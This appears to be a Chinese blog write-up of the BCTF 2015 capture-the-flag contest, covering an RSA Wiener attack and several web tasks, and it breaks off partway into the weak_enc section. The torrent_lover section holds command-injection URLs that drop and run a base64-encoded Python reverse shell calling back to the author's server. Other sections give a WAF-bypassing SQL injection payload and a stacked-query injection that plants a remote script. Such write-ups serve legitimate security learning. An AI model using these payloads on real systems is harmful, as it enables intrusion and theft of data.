@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Team: 0xFAcheckin (10pt)tags: trivial  Please checkin at IRC  IRC topic: OPGS{jr1p0zr-g0-OPGS-2015_t00q-yhpx} ROT-13: BCTF{we1c0me-t0-BCTF-2015_g00d-luck} flag: BCTF{we1c0me-t0-BCTF-2015_g00d-luck} wa">
+<meta name="keywords" content="ctf,writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BCTF2015 Writeup">
+<meta property="og:url" content="http://rickgray.me/2015/03/23/bctf2015-writeup/index.html">
+<meta property="og:site_name" content="rickgray.me">
+<meta property="og:description" content="Team: 0xFAcheckin (10pt)tags: trivial  Please checkin at IRC  IRC topic: OPGS{jr1p0zr-g0-OPGS-2015_t00q-yhpx} ROT-13: BCTF{we1c0me-t0-BCTF-2015_g00d-luck} flag: BCTF{we1c0me-t0-BCTF-2015_g00d-luck} wa">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://rickgray.me/images/ctfs/bctf2015/example.png">
+<meta property="og:image" content="http://rickgray.me/images/ctfs/bctf2015/webchat_p1.png">
+<meta property="og:image" content="http://rickgray.me/images/ctfs/bctf2015/webchat_p2.png">
+<meta property="og:image" content="http://rickgray.me/images/ctfs/bctf2015/webchat_p3.png">
+<meta property="og:updated_time" content="2018-04-24T15:49:05.537Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BCTF2015 Writeup">
+<meta name="twitter:description" content="Team: 0xFAcheckin (10pt)tags: trivial  Please checkin at IRC  IRC topic: OPGS{jr1p0zr-g0-OPGS-2015_t00q-yhpx} ROT-13: BCTF{we1c0me-t0-BCTF-2015_g00d-luck} flag: BCTF{we1c0me-t0-BCTF-2015_g00d-luck} wa">
+<meta name="twitter:image" content="http://rickgray.me/images/ctfs/bctf2015/example.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>BCTF2015 Writeup</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2015/04/15/simple-python-script-to-scan-weak-things/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2015/02/27/cve-2015-2080-analysis/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2015/03/23/bctf2015-writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2015/03/23/bctf2015-writeup/&text=BCTF2015 Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2015/03/23/bctf2015-writeup/&title=BCTF2015 Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2015/03/23/bctf2015-writeup/&is_video=false&description=BCTF2015 Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BCTF2015 Writeup&body=Check out this article: http://rickgray.me/2015/03/23/bctf2015-writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2015/03/23/bctf2015-writeup/&title=BCTF2015 Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2015/03/23/bctf2015-writeup/&title=BCTF2015 Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2015/03/23/bctf2015-writeup/&title=BCTF2015 Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2015/03/23/bctf2015-writeup/&title=BCTF2015 Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2015/03/23/bctf2015-writeup/&name=BCTF2015 Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Team-0xFA"><span class="toc-number">1.</span> <span class="toc-text">Team: 0xFA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#checkin-10pt"><span class="toc-number"></span> <span class="toc-text">checkin (10pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#warmup-50pt"><span class="toc-number"></span> <span class="toc-text">warmup (50pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#torrent-lover-233pt"><span class="toc-number"></span> <span class="toc-text">torrent_lover (233pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#experiment-300pt"><span class="toc-number"></span> <span class="toc-text">experiment (300pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-engine-200pt"><span class="toc-number"></span> <span class="toc-text">sqli_engine (200pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webchat-325pt"><span class="toc-number"></span> <span class="toc-text">webchat (325pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#weak-enc-200pt"><span class="toc-number"></span> <span class="toc-text">weak_enc (200pt)</span></a>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BCTF2015 Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">rickgray.me</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2015-03-22T16:00:00.000Z" itemprop="datePublished">2015-03-23</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/ctf/">ctf</a>, <a class="tag-link" href="/tags/writeup/">writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="Team-0xFA"><a href="#Team-0xFA" class="headerlink" title="Team: 0xFA"></a>Team: 0xFA</h3><h2 id="checkin-10pt"><a href="#checkin-10pt" class="headerlink" title="checkin (10pt)"></a>checkin (10pt)</h2><p>tags: <code>trivial</code></p>
+<blockquote>
+<p>Please checkin at IRC</p>
+</blockquote>
+<p>IRC topic: OPGS{jr1p0zr-g0-OPGS-2015_t00q-yhpx}</p>
+<p>ROT-13: BCTF{we1c0me-t0-BCTF-2015_g00d-luck}</p>
+<p>flag: <code>BCTF{we1c0me-t0-BCTF-2015_g00d-luck}</code></p>
+<h2 id="warmup-50pt"><a href="#warmup-50pt" class="headerlink" title="warmup (50pt)"></a>warmup (50pt)</h2><p>tags: <code>crypto</code></p>
+<blockquote>
+<p>c=0x1e04304936215de8e21965cfca9c245b1a8f38339875d36779c0f123c475bc24d5eef50e7d9ff5830e80c62e8083ec55f27456c80b0ab26546b9aeb8af30e82b650690a2ed7ea407dcd094ab9c9d3d25a93b2140dcebae1814610302896e67f3ae37d108cd029fae6362ea7ac1168974c1a747ec9173799e1107e7a56d783660418ebdf6898d7037cea25867093216c2c702ef3eef71f694a6063f5f0f1179c8a2afe9898ae8dec5bb393cdffa3a52a297cd96d1ea602309ecf47cd009829b44ed3100cf6194510c53c25ca7435f60ce5f4f614cdd2c63756093b848a70aade002d6bc8f316c9e5503f32d39a56193d1d92b697b48f5aa43417631846824b5e86</p>
+<p><a href="http://dl.bctf.cn/warmup-c6aa398e4f3e72bc2ea2742ae528ed79.pub.xz" target="_blank" rel="noopener">http://dl.bctf.cn/warmup-c6aa398e4f3e72bc2ea2742ae528ed79.pub.xz</a></p>
+</blockquote>
+<p>题目给了一个xz压缩包<code>warmup-c6aa398e4f3e72bc2ea2742ae528ed79.pub.xz</code>，通过<code>xz -d warmup-c6aa398e4f3e72bc2ea2742ae528ed79.pub.xz</code>得到一个公钥文件：</p>
+<pre><code>-----BEGIN PUBLIC KEY-----
+MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAQEDZxmNa1YU6VgTrdjyKkcX
+vHK+HqvZM9G4aUT9t1uO0jC+YtfRtp0iIJXBKMhvggEuyxFhkf2dAYptAvhNsnvF
+GiEwfchvS/dxxpHBQ+Wr5Um1vS1usaIf1icOfhtI/gYR+7LhsLNSTm9N6LTko0Xa
+RKE96CW3JgjbbHxKQLeCZubIe7/e9rSDgdScRQeli81Ht21ktFkIsVi9frxNrLCx
+z9bCwZV09A6y79Dp4Q3HAFytObyvUrnqw4czaNaQMcXnJGhKRPBo79HT3Altm11k
+EeWL3uQ+RrmaDQSUudsoGVr5Aa/xMNSm4gPa0I2lf6fkAmKlutsqMj7aKLRGlqsw
+XQKCAQEA85Wdl44C658G3vPzNdj4r9dgmVHdrGC3FLbCKvD6kS8hCzQga9JKlgHH
+jfSgJ18Qf9OrVS2VBX65NOcb3c1wRcJLGFh7jI/PWt1MXYPwx3yU3JxQy+Q44rZ7
+r9MWM7aq8XgdkMOtbwPQN7MyGAGyNUbUg+Z+JgZ/eyI0fdvAwtWSzoFMv138zBQU
+N/FOCzmQ+IBh5fC65fAeP6cNsOlgXnz9V16cge/uxSnDP9kDeiD9is1ROsljd2gx
+PmP5g4rjURzdCporUW8hSMjUdaNgoGNZRJc57s0lGrtCsBRXPkOfL6RXNVeyVpn/
+wR5jHOjul1qG5+JyvPX3apNFA0j+Pw==
+-----END PUBLIC KEY-----
+</code></pre><p>然后使用openssl得到RSA中的n与e的值<code>openssl rsa -pubin -text -modulus -in warmup-c6aa398e4f3e72bc2ea2742ae528ed79.pub</code></p>
+<pre><code>Public-Key: (2050 bit)
+Modulus:
+    03:67:19:8d:6b:56:14:e9:58:13:ad:d8:f2:2a:47:
+    17:bc:72:be:1e:ab:d9:33:d1:b8:69:44:fd:b7:5b:
+    8e:d2:30:be:62:d7:d1:b6:9d:22:20:95:c1:28:c8:
+    6f:82:01:2e:cb:11:61:91:fd:9d:01:8a:6d:02:f8:
+    4d:b2:7b:c5:1a:21:30:7d:c8:6f:4b:f7:71:c6:91:
+    c1:43:e5:ab:e5:49:b5:bd:2d:6e:b1:a2:1f:d6:27:
+    0e:7e:1b:48:fe:06:11:fb:b2:e1:b0:b3:52:4e:6f:
+    4d:e8:b4:e4:a3:45:da:44:a1:3d:e8:25:b7:26:08:
+    db:6c:7c:4a:40:b7:82:66:e6:c8:7b:bf:de:f6:b4:
+    83:81:d4:9c:45:07:a5:8b:cd:47:b7:6d:64:b4:59:
+    08:b1:58:bd:7e:bc:4d:ac:b0:b1:cf:d6:c2:c1:95:
+    74:f4:0e:b2:ef:d0:e9:e1:0d:c7:00:5c:ad:39:bc:
+    af:52:b9:ea:c3:87:33:68:d6:90:31:c5:e7:24:68:
+    4a:44:f0:68:ef:d1:d3:dc:09:6d:9b:5d:64:11:e5:
+    8b:de:e4:3e:46:b9:9a:0d:04:94:b9:db:28:19:5a:
+    f9:01:af:f1:30:d4:a6:e2:03:da:d0:8d:a5:7f:a7:
+    e4:02:62:a5:ba:db:2a:32:3e:da:28:b4:46:96:ab:
+    30:5d
+Exponent:
+    00:f3:95:9d:97:8e:02:eb:9f:06:de:f3:f3:35:d8:
+    f8:af:d7:60:99:51:dd:ac:60:b7:14:b6:c2:2a:f0:
+    fa:91:2f:21:0b:34:20:6b:d2:4a:96:01:c7:8d:f4:
+    a0:27:5f:10:7f:d3:ab:55:2d:95:05:7e:b9:34:e7:
+    1b:dd:cd:70:45:c2:4b:18:58:7b:8c:8f:cf:5a:dd:
+    4c:5d:83:f0:c7:7c:94:dc:9c:50:cb:e4:38:e2:b6:
+    7b:af:d3:16:33:b6:aa:f1:78:1d:90:c3:ad:6f:03:
+    d0:37:b3:32:18:01:b2:35:46:d4:83:e6:7e:26:06:
+    7f:7b:22:34:7d:db:c0:c2:d5:92:ce:81:4c:bf:5d:
+    fc:cc:14:14:37:f1:4e:0b:39:90:f8:80:61:e5:f0:
+    ba:e5:f0:1e:3f:a7:0d:b0:e9:60:5e:7c:fd:57:5e:
+    9c:81:ef:ee:c5:29:c3:3f:d9:03:7a:20:fd:8a:cd:
+    51:3a:c9:63:77:68:31:3e:63:f9:83:8a:e3:51:1c:
+    dd:0a:9a:2b:51:6f:21:48:c8:d4:75:a3:60:a0:63:
+    59:44:97:39:ee:cd:25:1a:bb:42:b0:14:57:3e:43:
+    9f:2f:a4:57:35:57:b2:56:99:ff:c1:1e:63:1c:e8:
+    ee:97:5a:86:e7:e2:72:bc:f5:f7:6a:93:45:03:48:
+    fe:3f
+Modulus=367198D6B5614E95813ADD8F22A4717BC72BE1EABD933D1B86944FDB75B8ED230BE62D7D1B69D222095C128C86F82012ECB116191FD9D018A6D02F84DB27BC51A21307DC86F4BF771C691C143E5ABE549B5BD2D6EB1A21FD6270E7E1B48FE0611FBB2E1B0B3524E6F4DE8B4E4A345DA44A13DE825B72608DB6C7C4A40B78266E6C87BBFDEF6B48381D49C4507A58BCD47B76D64B45908B158BD7EBC4DACB0B1CFD6C2C19574F40EB2EFD0E9E10DC7005CAD39BCAF52B9EAC3873368D69031C5E724684A44F068EFD1D3DC096D9B5D6411E58BDEE43E46B99A0D0494B9DB28195AF901AFF130D4A6E203DAD08DA57FA7E40262A5BADB2A323EDA28B44696AB305D
+writing RSA key
+-----BEGIN PUBLIC KEY-----
+MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAQEDZxmNa1YU6VgTrdjyKkcX
+vHK+HqvZM9G4aUT9t1uO0jC+YtfRtp0iIJXBKMhvggEuyxFhkf2dAYptAvhNsnvF
+GiEwfchvS/dxxpHBQ+Wr5Um1vS1usaIf1icOfhtI/gYR+7LhsLNSTm9N6LTko0Xa
+RKE96CW3JgjbbHxKQLeCZubIe7/e9rSDgdScRQeli81Ht21ktFkIsVi9frxNrLCx
+z9bCwZV09A6y79Dp4Q3HAFytObyvUrnqw4czaNaQMcXnJGhKRPBo79HT3Altm11k
+EeWL3uQ+RrmaDQSUudsoGVr5Aa/xMNSm4gPa0I2lf6fkAmKlutsqMj7aKLRGlqsw
+XQKCAQEA85Wdl44C658G3vPzNdj4r9dgmVHdrGC3FLbCKvD6kS8hCzQga9JKlgHH
+jfSgJ18Qf9OrVS2VBX65NOcb3c1wRcJLGFh7jI/PWt1MXYPwx3yU3JxQy+Q44rZ7
+r9MWM7aq8XgdkMOtbwPQN7MyGAGyNUbUg+Z+JgZ/eyI0fdvAwtWSzoFMv138zBQU
+N/FOCzmQ+IBh5fC65fAeP6cNsOlgXnz9V16cge/uxSnDP9kDeiD9is1ROsljd2gx
+PmP5g4rjURzdCporUW8hSMjUdaNgoGNZRJc57s0lGrtCsBRXPkOfL6RXNVeyVpn/
+wR5jHOjul1qG5+JyvPX3apNFA0j+Pw==
+-----END PUBLIC KEY-----
+</code></pre><p>其中n与e的值为：</p>
+<pre><code>n=0x367198D6B5614E95813ADD8F22A4717BC72BE1EABD933D1B86944FDB75B8ED230BE62D7D1B69D222095C128C86F82012ECB116191FD9D018A6D02F84DB27BC51A21307DC86F4BF771C691C143E5ABE549B5BD2D6EB1A21FD6270E7E1B48FE0611FBB2E1B0B3524E6F4DE8B4E4A345DA44A13DE825B72608DB6C7C4A40B78266E6C87BBFDEF6B48381D49C4507A58BCD47B76D64B45908B158BD7EBC4DACB0B1CFD6C2C19574F40EB2EFD0E9E10DC7005CAD39BCAF52B9EAC3873368D69031C5E724684A44F068EFD1D3DC096D9B5D6411E58BDEE43E46B99A0D0494B9DB28195AF901AFF130D4A6E203DAD08DA57FA7E40262A5BADB2A323EDA28B44696AB305D
+e=0xF3959D978E02EB9F06DEF3F335D8F8AFD7609951DDAC60B714B6C22AF0FA912F210B34206BD24A9601C78DF4A0275F107FD3AB552D95057EB934E71BDDCD7045C24B18587B8C8FCF5ADD4C5D83F0C77C94DC9C50CBE438E2B67BAFD31633B6AAF1781D90C3AD6F03D037B3321801B23546D483E67E26067F7B22347DDBC0C2D592CE814CBF5DFCCC141437F14E0B3990F88061E5F0BAE5F01E3FA70DB0E9605E7CFD575E9C81EFEEC529C33FD9037A20FD8ACD513AC9637768313E63F9838AE3511CDD0A9A2B516F2148C8D475A360A06359449739EECD251ABB42B014573E439F2FA4573557B25699FFC11E631CE8EE975A86E7E272BCF5F76A93450348FE3F
+</code></pre><p>可以看到值是非常大的，直接因式分解有点困难。这里有一个针对大值n&amp;e的攻击方法-<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">RSA-Wiener-Attack</a>。</p>
+<p>下载GitHub上的程序，使用<code>RSAwienerHacker.py</code>对大值n&amp;e进行hack，成功得到私钥d：</p>
+<pre><code>➜  rsa-wiener-attack-master  python RSAwienerHacker.py
+Hacked!
+(&apos;d = &apos;, 4221909016509078129201801236879446760697885220928506696150646938237440992746683409881141451831939190609743447676525325543963362353923989076199470515758399L)
+</code></pre><p>现在有了私钥直接对题目中给出的密文c进行解密即可：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">n = <span class="number">0x367198D6B5614E95813ADD8F22A4717BC72BE1EABD933D1B86944FDB75B8ED230BE62D7D1B69D222095C128C86F82012ECB116191FD9D018A6D02F84DB27BC51A21307DC86F4BF771C691C143E5ABE549B5BD2D6EB1A21FD6270E7E1B48FE0611FBB2E1B0B3524E6F4DE8B4E4A345DA44A13DE825B72608DB6C7C4A40B78266E6C87BBFDEF6B48381D49C4507A58BCD47B76D64B45908B158BD7EBC4DACB0B1CFD6C2C19574F40EB2EFD0E9E10DC7005CAD39BCAF52B9EAC3873368D69031C5E724684A44F068EFD1D3DC096D9B5D6411E58BDEE43E46B99A0D0494B9DB28195AF901AFF130D4A6E203DAD08DA57FA7E40262A5BADB2A323EDA28B44696AB305D</span></span><br><span class="line">d = <span class="number">4221909016509078129201801236879446760697885220928506696150646938237440992746683409881141451831939190609743447676525325543963362353923989076199470515758399L</span></span><br><span class="line">c = <span class="number">0x1e04304936215de8e21965cfca9c245b1a8f38339875d36779c0f123c475bc24d5eef50e7d9ff5830e80c62e8083ec55f27456c80b0ab26546b9aeb8af30e82b650690a2ed7ea407dcd094ab9c9d3d25a93b2140dcebae1814610302896e67f3ae37d108cd029fae6362ea7ac1168974c1a747ec9173799e1107e7a56d783660418ebdf6898d7037cea25867093216c2c702ef3eef71f694a6063f5f0f1179c8a2afe9898ae8dec5bb393cdffa3a52a297cd96d1ea602309ecf47cd009829b44ed3100cf6194510c53c25ca7435f60ce5f4f614cdd2c63756093b848a70aade002d6bc8f316c9e5503f32d39a56193d1d92b697b48f5aa43417631846824b5e86</span></span><br><span class="line"></span><br><span class="line">m = hex(pow(c, d, n)).rstrip(<span class="string">"L"</span>)</span><br><span class="line"><span class="keyword">print</span> m</span><br><span class="line"><span class="keyword">print</span> binascii.unhexlify(m[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure>
+<p>然后得到输出：</p>
+<pre><code>0x424354467b3965745265613479217d
+BCTF{9etRea4y!}
+</code></pre><p>flag: <code>BCTF{9etRea4y!}</code></p>
+<h2 id="torrent-lover-233pt"><a href="#torrent-lover-233pt" class="headerlink" title="torrent_lover (233pt)"></a>torrent_lover (233pt)</h2><p>tags: <code>web</code></p>
+<blockquote>
+<p>A dog loves torrent.</p>
+<p><code>http://218.2.197.253/index.php</code></p>
+</blockquote>
+<p>一开始在VPS上运行nc进行监听，在页面提交对应地址时，发现UA头为<code>wget</code>，想到可能是命令注入，然后尝试在url里插入linux命令：</p>
+<pre><code>http://103.224.82.158:8888/`whoami`.torrent
+</code></pre><p>通过发送的数据可以看到确实存在命令注入：</p>
+<pre><code>[demo@vps ~]$ nc -v -l 8888
+Connection from 218.2.197.253 port 8888 [tcp/ddi-tcp-1] accepted
+GET /www-data.torrent HTTP/1.1
+User-Agent: Wget/1.15 (linux-gnu)
+Accept: */*
+Host: 103.224.82.158:8888
+Connection: Keep-Alive
+</code></pre><p>因服务器过滤了空格，所以为了使用带参数的命令，这里用<a href="http://en.wikipedia.org/wiki/Internal_field_separator" target="_blank" rel="noopener">$IFS</a>来代替空格。然后通过命令执行来写入一个python的反弹shell脚本并执行：</p>
+<p>写入shell(0002.py)</p>
+<pre><code>http://103.224.82.158:8000%2F`echo$IFS&quot;aW1wb3J0IGJhc2U2NCxzeXM7ZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKHsyOnN0ciwzOmxhbWJkYSBiOmJ5dGVzKGIsJ1VURi04Jyl9W3N5cy52ZXJzaW9uX2luZm9bMF1dKCdhVzF3YjNKMElITnZZMnRsZEN4emRISjFZM1FLY3oxemIyTnJaWFF1YzI5amEyVjBLRElzYzI5amEyVjBMbE5QUTB0ZlUxUlNSVUZOS1FwekxtTnZibTVsWTNRb0tDY3hNRE11TWpJMExqZ3lMakUxT0Njc016RXpNemNwS1Fwc1BYTjBjblZqZEM1MWJuQmhZMnNvSno1Skp5eHpMbkpsWTNZb05Da3BXekJkQ21ROWN5NXlaV04yS0d3cENuZG9hV3hsSUd4bGJpaGtLVHhzT2dvSlpDczljeTV5WldOMktHd3RiR1Z1S0dRcEtRcGxlR1ZqS0dRc2V5ZHpKenB6ZlNrSycpKSkK&quot;|base64$IFS--decode$IFS&gt;/tmp/0002.py`.index.torrent
+</code></pre><p>然后执行弹回shell</p>
+<pre><code>http://103.224.82.158:8000/`python$IFS/tmp/0002.py`.index.torrent
+</code></pre><p>通过浏览目录，发现上级目录中存在一敏感目录<code>flag</code>，进去看到只有两个文件，查看其权限：</p>
+<pre><code>$ ls -al
+total 24
+drwxr-xr-x 2 root root     4096 Mar 21 15:14 .
+drwxr-xr-x 5 root root     4096 Mar 21 22:39 ..
+-r-------- 1 flag flag       57 Mar 21 12:14 flag
+-rwsr-x--- 1 flag www-data 8871 Mar 21 12:13 use_me_to_read_flag
+</code></pre><p>若直接在<code>/var/www/flag</code>下运行<code>use_me_to_read_flag</code>程序去读取<code>flag</code>文件，会没有权限。将flag文件在<code>/tmp</code>下建立一链接后再读取即可：</p>
+<pre><code>$ cd /tmp
+$ ln -s /var/www/flag/flag x
+$ /var/www/flag/use_me_to_read_flag x
+BCTF{Do_not_play_dota2_or_you_will_be_stupid_like_me233}
+</code></pre><p>flag: <code>BCTF{Do_not_play_dota2_or_you_will_be_stupid_like_me233}</code></p>
+<h2 id="experiment-300pt"><a href="#experiment-300pt" class="headerlink" title="experiment (300pt)"></a>experiment (300pt)</h2><p>tags: <code>programming</code></p>
+<blockquote>
+<p>Hi, we have a short survey with 50 questions. You can get a flag as award once you finished it.</p>
+<p><code>nc 104.197.7.111 13135</code></p>
+</blockquote>
+<p>题目要求回答50道题目才能获取flag。nc连上去后首先是10轮的整形判断（PS：”rm -ri *” seens well），接着是40轮的序列计算，根据服务端给出的描述信息和样例序列可以到著名网站<a href="http://oeis.org/" target="_blank" rel="noopener">http://oeis.org/</a>进行查询搜索，并且第11-45轮的答案都能在网站的样例序列中找到。46-50轮的答案无法在网站上直接查出，但是能在oeis.org上直接查到相关数据软件的算法代码，这里本地使用<a href="http://www.maplesoft.com/maple/" target="_blank" rel="noopener">Maple</a>进行最后5轮的计算，最后成功获取到flag :)（中间遇到了很多坑，后来才使用Maple搞定）。</p>
+<p><img src="/images/ctfs/bctf2015/example.png" alt="img"></p>
+<p>flag: <code>BCTF{Y0u_h4ve_m0ar_7ermz_than_205}</code></p>
+<h2 id="sqli-engine-200pt"><a href="#sqli-engine-200pt" class="headerlink" title="sqli_engine (200pt)"></a>sqli_engine (200pt)</h2><p>tags: <code>web</code></p>
+<blockquote>
+<p><a href="http://104.197.7.111:8080/" target="_blank" rel="noopener">http://104.197.7.111:8080/</a></p>
+<p>geohot told me he has a lot of sql injection tricks. So I wrote a sql injection detection engine in defense.</p>
+<p>Now you have a simple website protected by my engine, try to steal the admin’s password(not hash).</p>
+</blockquote>
+<pre><code>form = web.input()
+
+username = form.get(&apos;username&apos;)
+password = form.get(&apos;password&apos;)
+
+if sqliengine.is_sqli(username):
+raise web.BadRequest(u&apos;username contains SQL injection, IP recorded.&apos;)
+
+if sqliengine.is_sqli(password):
+raise web.BadRequest(u&apos;password contains SQL injection, IP recorded&apos;)
+
+if sqliengine.is_sqli(username + password):
+raise web.BadRequest(u&apos;username + password contains SQL injection, IP recorded&apos;)
+
+# continue normal db operation
+</code></pre><blockquote>
+<p>There are only two pages: login and register, please do not use web scanner to brute force, just do the sqli part.</p>
+</blockquote>
+<p>登陆的地方，绕绕绕waf就可以了：</p>
+<pre><code>username=admin&amp;password=admin&apos; %0a%23%0aUnIOn%23%0aSeLecT+1,(select{x password}from{x users}%23%0awhere id=1),3%23
+</code></pre><p>flag: <code>{h0w-d1d-y0u-fee1-l1ke-th3-sql1-eng1ne}</code></p>
+<h2 id="webchat-325pt"><a href="#webchat-325pt" class="headerlink" title="webchat (325pt)"></a>webchat (325pt)</h2><p>tags: <code>web</code></p>
+<blockquote>
+<p><a href="http://146.148.60.107:9991/" target="_blank" rel="noopener">http://146.148.60.107:9991/</a></p>
+</blockquote>
+<p>看过一篇文章<a href="http://sec.chinabyte.com/420/13180920.shtml" target="_blank" rel="noopener">WebSocket跨站劫持</a>和题目很像，里面有个Tools-<a href="http://ironwasp.org/cswsh.html" target="_blank" rel="noopener">csws</a></p>
+<p>用Chrome看了下包：</p>
+<p><img src="/images/ctfs/bctf2015/webchat_p1.png" alt="img"></p>
+<p>构造一下：</p>
+<p><img src="/images/ctfs/bctf2015/webchat_p2.png" alt="img"></p>
+<p>成功通信，想测试xss来打Cookies发现过滤了7788的 手抖打了个引号发现报错了：</p>
+<blockquote>
+<p>eDatabase error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’aaa: aaa’’)’ at line 1</p>
+</blockquote>
+<p>猜想他的SQL语句是这样写的</p>
+<pre><code>insert into test values (&apos;aaa: aaa&apos;);
+</code></pre><p>因为SCTF有一题sqli &gt;&gt; xss的 而且在不知道后台的情况下 注出数据没啥用 所以尝试select一个xss语句，但是发现#,–,/*等注释语句都被过滤了 后来想到多语句执行：</p>
+<pre><code>insert into test values (&apos;aaa: aaaa&apos;),((select 0x3C736372697074207372633D687474703A2F2F742E636E2F52417A57394A503E3C2F7363726970743E));&apos;)
+</code></pre><p>这样就可以同时插入2条数据,虽然返回是错误 但是数据成功插入了，Get!</p>
+<p><img src="/images/ctfs/bctf2015/webchat_p3.png" alt="img"></p>
+<p>flag: <code>BCTF{xss_is_not_that_difficult_right}</code></p>
+<h2 id="weak-enc-200pt"><a href="#weak-enc-200pt" class="headerlink" title="weak_enc (200pt)"></a>weak_enc (200pt)</h2><p>tags: <code>crypto</code></p>
+<blockquote>
+<p><code>$ nc 146.148.79.13 8888</code></p>
+<p><a href="http://dl.bctf.cn/weak_enc-40eb1171f07d8ebb06bbf36849d829a1.py.xz" target="_blank" rel="noopener">http://dl.bctf.cn/weak_enc-40eb1171f07d8ebb06bbf36849d829a1.py.xz</a></p>
+<p>Decrypt: NxQ1NDMYcDcw53gVHzI7</p>
+<p>The flag for this problem does not look like BCTF{xxxxxx}</p>
+</blockquote>
+<p>连上去返回：</p>
+<blockquote>
